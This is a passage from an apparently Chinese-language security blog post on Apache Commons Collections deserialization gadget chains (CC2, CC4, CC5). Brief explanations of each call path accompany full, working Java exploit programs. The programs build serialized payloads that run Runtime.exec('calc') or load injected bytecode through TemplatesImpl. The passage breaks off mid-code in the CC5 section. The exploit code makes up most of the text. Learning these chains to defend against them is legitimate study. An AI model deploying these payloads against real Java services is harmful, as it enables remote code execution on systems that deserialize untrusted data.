class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class clazz=tmpl.getClass();</span><br><span class="line">        Field namefeld= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        namefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefeld.set(tmpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytefeld= clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes= &#123;code&#125;;</span><br><span class="line">        bytefeld.set(tmpl,bytecodes);</span><br><span class="line">        Field tfactoryfeld= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfeld.set(tmpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tmpl&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Constructor constructor=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        Serializ(o);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>CC2是collections4的一条链，虽然CC1,3，6都是collections3.1的链子但是其实只要将LazyMap或者TransformedMap的构造器由decorate改为lazyMap或者transformedMap即可命令执行<br><img src="/2024/09/25/CC%E9%93%BE/CC2_1.png" class="" title="alt text"></p>
<p>好了接下来开始讲CC2<br>CC2的链其实也就是开头位置发生了更改。即开头变为了PriorityQueue-&gt;TransformingComparator-&gt;TransformingComparator.transform()</p>
<p>从PriorityQueue到TransformingCompartor的过程如下readObject-&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator-&gt;compare-&gt;transform如下<br><img src="/2024/09/25/CC%E9%93%BE/CC2_3.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC2_4.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC2_5.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC2_6.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC2_2.png" class="" title="alt text"><br>知道这两个的调用过程我们就可以简单的编写出exp了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CC2</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser_c.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">    Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//因为只有当参数大于二的时候才可以触发队列排比，且这些add的参数就是后续compar的参数</span></span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        Serializ(queue);</span><br><span class="line">        Unserializ(<span class="string">&quot;Ser_c.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>其实这个CC2还能进行改进，使用加载字节码的方法来尝试无数组执行命令。</p>
<p>在学校CC6的时候学习到了当transform的参数可控时我们可以不需要属性就可以利用加载字节码的方法进行命令执行。</p>
<p>而这条链的我们通过queue.add(templates);的方法来进行传入的参数会在反序列时触发的transform中被调用exp如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2_loader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CC2_loader</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(templates);</span><br><span class="line">        queue.add(templates);</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        Serializ(queue);</span><br><span class="line">        Unserializ(<span class="string">&quot;Ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>CC4其实就是将加载字节码的方式由最终的反射获取改为了通过TrAXFilter的构造方法触发<br>即其后半段改为了cc3的另一种加载字节码的方法<br>exp如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CC4</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Transformer transformer = new InvokerTransformer(&quot;toString&quot;, null, null);</span></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, Transformer);</span><br><span class="line">        <span class="comment">//setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);</span></span><br><span class="line"></span><br><span class="line">        Serializ(queue);</span><br><span class="line">        Unserializ(<span class="string">&quot;Ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>学了前面的几条CC链，学这个CC5的难度其实并不算高了。其和前面的差别其实也就是入口的类发生了改变，后半段与CC6一样就是入口的类改为了BadAttributeValueExpException的readObject来触发toString<br>exp如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    